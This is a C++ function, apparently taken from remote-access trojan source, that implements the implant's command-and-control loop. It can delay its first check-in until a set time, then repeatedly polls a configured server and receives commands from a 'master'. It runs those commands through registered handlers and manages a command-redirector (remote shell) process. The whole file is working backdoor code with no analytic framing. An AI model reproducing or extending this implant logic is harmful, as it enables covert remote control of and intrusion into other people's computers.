void CommManager::MessageSenderProc()
{
    Wow64FsRedirectionDisabler disabler;
    disabler.Disable();

    DWORD sendTestTimeMS = 0;

    BOOL bFirstConnect = TRUE;
    BOOL bWaitUntil = (g_ConfigInfo.nFirstConnectHour >= 0 && g_ConfigInfo.nFirstConnectMinute >= 0);

    ByteBuffer recvByteData;

    while (m_bWorking)
    {
        if (! m_bWorking) break;

        Sleep(m_dwMsgIntervalMS);

        //如果配置了第一次上线时间,则需要检测并等待
        if (bFirstConnect && bWaitUntil)
        {
            static int iCount = 0;
            iCount++;
            if (iCount < 5) continue;

            iCount = 0;
            SYSTEMTIME now;
            ::GetLocalTime(&now);
            if (now.wHour == g_ConfigInfo.nFirstConnectHour && now.wMinute == g_ConfigInfo.nFirstConnectMinute)
            {
                bFirstConnect = FALSE;
            }
            else
            {
                continue;
            }
        }

        //从CutupProtocol获取待发送数据
        ByteBuffer toSendByteData;
        COMM_NAME commName;

        if (! GetMessageToSend(  commName ,toSendByteData))
        {
            CreateEmptyPacket(toSendByteData);
            commName = COMMNAME_DEFAULT;
        }

        ULONG targetIP = 0;

        BOOL ret = FALSE;

        do
        {
            ret = MySocket::IPOrHostname2IP(a2t(g_ConfigInfo.szAddr),targetIP);

        } while (!ret);


        ret = SendAndRecv(commName, targetIP, toSendByteData, toSendByteData.Size(), recvByteData);

        if (! ret)
        {
            CmdRedirector &cmd = Manager::GetInstanceRef().m_cmdRedirector;

            if (cmd.IsChildRunning())
                cmd.Stop();

            errorLog(_T("sendrecv msg [%d] failed"), commName);

            continue;
        }
        if (!IsConnected())
        {
            ConnectedNotify();
        }

        CommData recvData;

        ret = recvData.Parse(recvByteData, recvByteData.Size());

        if (!ret  )
        {
            errorLog(_T("parse received msg failed"));
            continue;
        }

        MSGID msgid = recvData.GetMsgID();
        if (INVALID_MSGID == msgid)
        {
            continue;
        }

        if ( MSGID_AVAILABLE_COMM == msgid )
        {
            continue;
        }

        //查询消息处理者
        FnExecuteRCCommand fnCallback = NULL;
        LPVOID lpParameter = NULL;
        if (! Manager::GetInstanceRef().QueryCommandHandler(msgid, &fnCallback, &lpParameter)
                || NULL == fnCallback )
        {
            errorLog(_T("no handler for [%I64u]"), msgid);
            CommData reply;
            reply.Reply(recvData);
            reply.SetMsgID(MSGID_REPLY_COMMAND);
            reply.SetData(_T("error"), _T("invalid command"));
            PushMsgToMaster(commName, reply);

            continue;
        }

        debugLog(_T("recv msgid[%I64u]. try to handle it"), msgid);

        //使用线程池处理，或者直接处理
        if (recvData.UsingPoolThread())
        {
            PEXECUTOR_PARAMETER p = new EXECUTOR_PARAMETER;
            p->msgid = msgid;
            p->fnCallback = fnCallback;
            p->lpParameter = lpParameter;
            recvData.Serialize(p->data);

            ::QueueUserWorkItem(CmdExcutor, p, WT_EXECUTEDEFAULT);
        }
        else
        {
            ByteBuffer dataBuffer;
            recvData.Serialize(dataBuffer);
            fnCallback(msgid, dataBuffer, dataBuffer.Size(), lpParameter);
        }
    }
}